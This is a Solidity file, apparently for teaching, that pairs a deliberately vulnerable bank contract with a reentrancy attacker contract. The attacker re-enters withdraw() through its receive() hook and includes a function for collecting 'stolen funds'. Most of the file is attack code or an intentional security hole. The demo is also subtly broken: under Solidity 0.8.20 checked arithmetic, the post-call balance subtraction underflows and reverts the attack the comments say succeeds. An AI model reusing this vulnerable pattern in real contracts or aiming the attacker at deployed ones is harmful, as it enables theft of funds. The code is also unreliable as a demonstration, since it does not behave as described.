// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title VulnerableBank
 * @dev Demonstrates reentrancy attack vulnerability
 * VULNERABILITY: Classic reentrancy exploit in withdrawal function
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    /**
     * @dev Deposit funds
     */
    function deposit() external payable {
        require(msg.value > 0, "Must deposit non-zero amount");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @dev VULNERABLE: Reentrancy attack possible
     * State changes happen AFTER external call
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State update happens after external call
        balances[msg.sender] -= amount;
        
        emit Withdrawal(msg.sender, amount);
    }
    
    /**
     * @dev Get user balance
     */
    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
    
    /**
     * @dev Get contract balance
     */
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title ReentrancyAttacker
 * @dev Contract to demonstrate reentrancy attack
 */
contract ReentrancyAttacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackAmount;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;
    
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }
    
    /**
     * @dev Start the attack
     */
    function attack() external payable {
        require(msg.value > 0, "Need funds to attack");
        attackAmount = msg.value;
        attackCount = 0;
        
        // Deposit initial funds
        vulnerableBank.deposit{value: msg.value}();
        
        // Start the attack
        vulnerableBank.withdraw(msg.value);
    }
    
    /**
     * @dev Fallback function that re-enters the vulnerable contract
     */
    receive() external payable {
        if (attackCount < maxAttacks && address(vulnerableBank).balance >= attackAmount) {
            attackCount++;
            vulnerableBank.withdraw(attackAmount);
        }
    }
    
    /**
     * @dev Withdraw stolen funds
     */
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    /**
     * @dev Get contract balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
